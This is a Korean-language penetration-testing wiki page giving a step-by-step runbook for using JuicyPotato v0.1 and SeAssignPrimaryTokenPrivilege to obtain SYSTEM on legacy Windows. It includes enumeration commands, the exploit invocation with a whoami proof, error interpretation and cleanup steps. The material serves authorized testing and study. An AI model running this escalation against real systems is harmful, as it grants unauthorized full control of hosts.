---
tags:
  - 환경/windows
시작조건: ["대상 Windows 호스트의 명령 실행", "현재 token에 SeAssignPrimaryTokenPrivilege가 할당됨"]
필요권한: ["SeAssignPrimaryTokenPrivilege", "일반적으로 SeIncreaseQuotaPrivilege"]
필요조건: ["classic JuicyPotato가 동작하는 legacy Windows build", "대상 build·edition에서 확인한 CLSID", "사용 중이지 않은 로컬 COM listener 포트", "대상 arch에 맞는 JuicyPotato v0.1 실행 파일"]
결과: ["SYSTEM 자식 프로세스 생성", "SYSTEM 명령 실행 확인"]
---

# JuicyPotato로 SeAssignPrimaryTokenPrivilege 권한 상승

## 한 줄 판단

현재 token에 `SeAssignPrimaryTokenPrivilege`가 있고 classic DCOM·NTLM reflection이 가능한 legacy Windows에서 유효한 CLSID와 빈 로컬 포트를 확인했다면, JuicyPotato v0.1의 `-t u` 모드로 SYSTEM primary token을 사용하는 자식 명령을 생성한다.

## 전제 조건

이 문서는 classic JuicyPotato v0.1의 `CreateProcessAsUser` 경로만 다룬다. Windows 10 1809 이상과 Windows Server 2019 이상에는 이 DCOM 경로를 일반 적용하지 않는다. 정확한 build·edition이 upstream CLSID 목록에 있고 선택한 COM class가 현재 사용자에게 생성 가능하며 `IMarshal`을 구현하고 고권한 계정으로 실행되는 legacy 환경에서만 후보로 둔다.

`SeAssignPrimaryTokenPrivilege`는 이미 얻은 primary token을 새 process에 지정하는 단계에 작용한다. SYSTEM token 획득, token access rights와 process 생성은 [[Windows 액세스 토큰과 특권 활성화]]처럼 별도 단계다. Microsoft의 `CreateProcessAsUser` 계약상 호출자는 일반적으로 `SeIncreaseQuotaPrivilege`도 필요하며, token에는 `TOKEN_QUERY`, `TOKEN_DUPLICATE`, `TOKEN_ASSIGN_PRIMARY`가 필요하다.

| 확인할 것 | 필요한 상태 | 확인 방법 | 미충족 시 다음 확인 |
|---|---|---|---|
| 실행 위치 | 권한을 높일 대상 Windows 호스트의 CMD·PowerShell 또는 명령 실행 채널 | `hostname`, `whoami` | 공격 호스트가 아니라 대상 세션인지 재확인 |
| privilege | 현재 token에 `SeAssignPrimaryTokenPrivilege`와 일반적으로 `SeIncreaseQuotaPrivilege`가 존재 | `whoami /priv`에서 없음·Disabled·Enabled를 구분 | 이름이 없으면 이 경로를 사용하지 않음. Disabled는 도구의 API 호출 결과로 활성화·사용 여부 확인 |
| 대상 OS | classic JuicyPotato가 동작하는 legacy build·edition | `winver`, `systeminfo`와 upstream CLSID 디렉터리 대조 | Windows 10 1809+·Server 2019+이면 이 경로를 사용하지 않고 별도 최신 구현의 실제 privilege 요구사항 확인 |
| COM class | exact build·edition 목록에 있고 현재 host에서 SYSTEM token을 반환하는 `<CLSID>` | upstream의 OS별 CLSID 목록과 실행 출력의 `<CLSID>;NT AUTHORITY\SYSTEM` | 기본 BITS CLSID를 추측하지 말고 같은 build·edition의 다른 후보 검토 |
| transient listener | 대상 localhost의 `<JUICY_COM_PORT>`가 사용 중이지 않음 | `Get-NetTCPConnection -LocalPort <JUICY_COM_PORT>` 또는 `netstat -ano` | 다른 process가 사용하면 그 process를 종료하지 말고 다른 빈 포트 선택 |
| 실행 파일·Identity 확인 파일 | 작업 전 없던 exact `<JUICYPOTATO_PATH>`와 `<SYSTEM_PROOF_PATH>` | 두 경로의 `Test-Path`가 반입·생성 전에 `False` | 기존 파일과 충돌하지 않는 공백 없는 고유 경로 선택 |

## 실행

### 1. build·privilege·listener 기준선 확인

대상 Windows PowerShell에서 현재 token, exact OS build와 선택한 포트의 기존 listener를 확인한다.

```powershell
whoami /priv
Get-WmiObject Win32_OperatingSystem | Select-Object Caption,Version,BuildNumber,OSArchitecture
netstat -ano | findstr ":<JUICY_COM_PORT>"
Test-Path -LiteralPath '<JUICYPOTATO_PATH>'
Test-Path -LiteralPath '<SYSTEM_PROOF_PATH>'
```

listener 조회 결과가 없고 두 `Test-Path`가 `False`여야 한다. `Get-WmiObject`를 사용할 수 없으면 `systeminfo`로 같은 build·edition을 확인한다. `findstr` 결과가 없다는 사실은 그 시점에 해당 포트 문자열이 보이지 않았다는 뜻이므로 실행 직전 bind 성공을 도구 출력으로 다시 확인한다. `SeAssignPrimaryTokenPrivilege Disabled`는 미보유가 아니지만 아직 사용 성공도 아니다. `SeIncreaseQuotaPrivilege`가 없거나 build·edition에 맞는 CLSID 근거가 없으면 실행하지 않는다.

`<JUICY_COM_PORT>`는 대상 Windows localhost에서 비어 있는 TCP 포트(예: `1337`), `<JUICYPOTATO_PATH>`는 대상의 새 실행 파일 절대 경로(예: `C:\\Temp\\JuicyPotato.exe`), `<SYSTEM_PROOF_PATH>`는 이번 자식 명령이 만든 `nt authority\system` Identity를 판정하는 새 확인 파일 경로다. `<CLSID>`는 대상 build·edition에 대응하는 upstream 목록의 GUID를 그대로 사용한다.

### 2. 실행 파일 반입과 무결성 확인

[[상황별 파일 전송]]의 현재 Windows 경로로 JuicyPotato를 반입한 뒤 exact 파일의 arch·경로와 version을 기록한다.

```powershell
Get-Item -LiteralPath '<JUICYPOTATO_PATH>' | Select-Object FullName,Length,LastWriteTime,VersionInfo
```

### 3. CreateProcessAsUser 모드로 SYSTEM proof 생성

대상 Windows 명령 채널에서 upstream OS별 목록으로 고른 exact CLSID를 사용한다. `<SYSTEM_PROOF_PATH>`는 공백 없는 고유 경로로 치환한다.

```cmd
<JUICYPOTATO_PATH> -l <JUICY_COM_PORT> -c "{<CLSID>}" -p C:\Windows\System32\cmd.exe -a "/c whoami > <SYSTEM_PROOF_PATH>" -t u
type <SYSTEM_PROOF_PATH>
```

확인할 출력:

- `Testing {<CLSID>} <JUICY_COM_PORT>` 뒤 인증 결과와 `{<CLSID>};NT AUTHORITY\SYSTEM` token 표시를 확인한다.
- `CreateProcessAsUser OK`와 proof 파일의 `nt authority\system`이 모두 있어야 SYSTEM 명령 실행을 확정한다. token 표시만 있고 process 생성이 실패하면 성공이 아니다.
- `CreateProcessAsUser Failed to create proc: 1314`이면 `SeAssignPrimaryTokenPrivilege`·`SeIncreaseQuotaPrivilege`의 존재와 활성화, captured token의 access rights를 먼저 확인한다.
- `COM -> recv failed`, socket 오류, SYSTEM이 아닌 token은 build·CLSID·로컬 포트·DCOM 경로가 맞지 않은 상태다. 임의의 CLSID를 반복하지 말고 exact OS 목록과 첫 실패 단계를 다시 확인한다.
- proof 파일이 없으면 `-a` quoting, 대상 경로 쓰기 권한과 자식 process 초기화 실패를 확인한다.

실행이 멈춰 별도 대상 세션에서 확인해야 할 때는 고유 binary path로 process를 식별하고 PID·생성 시각과 listener owning PID를 함께 기록한다.

```powershell
Get-WmiObject Win32_Process |
  Where-Object ExecutablePath -eq '<JUICYPOTATO_PATH>' |
  Select-Object ProcessId,CreationDate,ExecutablePath,CommandLine
netstat -ano | findstr ":<JUICY_COM_PORT>"
```

## 관찰과 상태 전환

| 관찰 | 판단 | 결과 상태 | 다음 행동 |
|---|---|---|---|
| SYSTEM token, `CreateProcessAsUser OK`, proof의 `nt authority\system` | token 획득과 SYSTEM 자식 명령 실행 성공 | SYSTEM 명령 실행 | [[고권한 세션 확보 후 후속 판단]] |
| SYSTEM token은 표시되지만 process 생성 실패 | DCOM 단계는 진행됐지만 primary token 지정·process 생성 실패 | SYSTEM 결과 미확정 | privilege·token access rights와 오류 코드 확인 |
| COM·socket·CLSID 단계 실패 | 현재 build·class·포트에서 SYSTEM token 미획득 | 일반 Windows 명령 실행 유지 | exact build의 CLSID와 listener 충돌 확인. 최신 Windows이면 이 기법 중단 |
| proof가 없거나 다른 Identity | 자식 명령 실행 또는 실제 token 미확인 | SYSTEM 결과 미확정 | command quoting·쓰기 경로와 child Identity 확인 |

## 변경 영향과 복구

정상 proof 명령은 짧게 종료되며 JuicyPotato의 COM listener도 도구 process와 함께 사라져야 한다. 작업에서 만든 exact binary·proof 파일과, 실패로 남은 경우에만 기록한 JuicyPotato PID·listener를 정리한다. 기존 listener나 이름이 같은 다른 process를 종료하지 않는다.

실행이 멈췄다면 PID와 `CreationDate`·`ExecutablePath`가 기록과 모두 일치할 때만 해당 process를 종료한다.

```powershell
$jp = Get-WmiObject Win32_Process -Filter 'ProcessId = <JUICYPOTATO_PID>'
if ($jp -and
    $jp.CreationDate -eq '<JUICYPOTATO_CREATION_DATE>' -and
    $jp.ExecutablePath -eq '<JUICYPOTATO_PATH>') {
  Stop-Process -Id <JUICYPOTATO_PID>
}
Get-WmiObject Win32_Process -Filter 'ProcessId = <JUICYPOTATO_PID>'
netstat -ano | findstr ":<JUICY_COM_PORT>"
```

process와 listener가 없어진 뒤 이번 작업에서 생성한 두 파일만 제거한다.

```powershell
Remove-Item -LiteralPath '<SYSTEM_PROOF_PATH>' -Force
Remove-Item -LiteralPath '<JUICYPOTATO_PATH>' -Force
Test-Path -LiteralPath '<SYSTEM_PROOF_PATH>'
Test-Path -LiteralPath '<JUICYPOTATO_PATH>'
```

두 `Test-Path`가 `False`이고 port 조회 결과가 없어야 정리를 확인한 것이다. process 종료 뒤에도 port가 남으면 `OwningProcess`를 확인하되 기록한 PID와 다른 기존 process는 종료하지 않는다. 원격 연결이 끊겨 process·listener·파일을 확인할 수 없으면 복구 완료로 표시하지 않는다.

## 관련 공격기법

- [[Windows 권한 상승 열거]]
- [[PrintSpoofer로 SeImpersonatePrivilege 권한 상승]]
- [[상황별 파일 전송]]

## 관련 상태 라우터

- [[Windows 셸 또는 세션 확보 후 컨텍스트 열거]]
- [[고권한 세션 확보 후 후속 판단]]

## 관련 도구

- [[JuicyPotato]]
- [[powershell]]

## 참고 링크

- [ohpe: JuicyPotato](https://github.com/ohpe/juicy-potato)
- [ohpe: OS별 CLSID 목록](https://github.com/ohpe/juicy-potato/tree/master/CLSID)
- [Microsoft: CreateProcessAsUserW](https://learn.microsoft.com/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessasuserw)
- [Microsoft: Privilege Constants](https://learn.microsoft.com/windows/win32/secauthz/privilege-constants)
- [itm4n: modern Windows에서 classic Potato 제약과 token 경계](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
